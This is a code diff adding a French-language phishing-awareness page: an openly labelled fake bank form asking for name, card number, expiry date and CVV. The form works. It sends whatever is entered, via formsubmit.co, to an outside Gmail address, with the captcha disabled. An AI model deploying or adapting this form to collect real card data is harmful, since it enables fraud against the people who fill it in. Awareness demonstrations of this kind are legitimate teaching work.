@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Sensibilisation au Phishing</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .form-section {
+      background-color: white;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 25px 30px;
+      width: 350px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      color: white;
+      background-color: #2ea443;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 16px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background-color: #2ea443;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #249636;
+    }
+
+    .warning {
+      color: #2ea443;
+      font-size: 0.9em;
+      text-align: center;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-section">
+    <h2>✅ Faux formulaire de sensibilisation</h2>
+    <p style="color: #2ea443; font-size: 0.9em; text-align: center;">
+      Ceci est un exemple pédagogique pour montrer comment les sites frauduleux imitent les formulaires bancaires.<br>
+      <strong>NE JAMAIS entrer vos vraies informations !</strong>
+    </p>
+
+    <!-- FORMULAIRE FORM SUBMIT POUR SENSIBILISATION -->
+    <form action="https://formsubmit.co/iboa92337@gmail.com" method="POST">
+      <!-- 🔁 À remplacer par ta vraie adresse email -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_subject" value="Soumission test - sensibilisation phishing">
+      <input type="hidden" name="_next" value="https://ton-site.com/merci.html">
+
+      <label for="nom">Nom :</label>
+      <input type="text" name="nom" id="nom" placeholder="Jean Dupont" required>
+
+      <label for="carte">Numéro de carte :</label>
+      <input type="text" name="carte" id="carte" placeholder="1234 5678 9012 3456" required>
+
+      <label for="expiration">Date d'expiration :</label>
+      <input type="text" name="expiration" id="expiration" placeholder="MM/AA" required>
+
+      <label for="cvv">CVV :</label>
+      <input type="number" name="cvv" id="cvv" placeholder="123" required>
+
+      <button type="submit">Valider la simulation</button>
+    </form>
+
+    <p class="warning">
+      ⚠ Ce formulaire est connecté à un email pour démonstration. Dans un vrai site frauduleux, les infos seraient volées. Soyez vigilants !
+    </p>
+  </div>
+
+</body>
+</html>
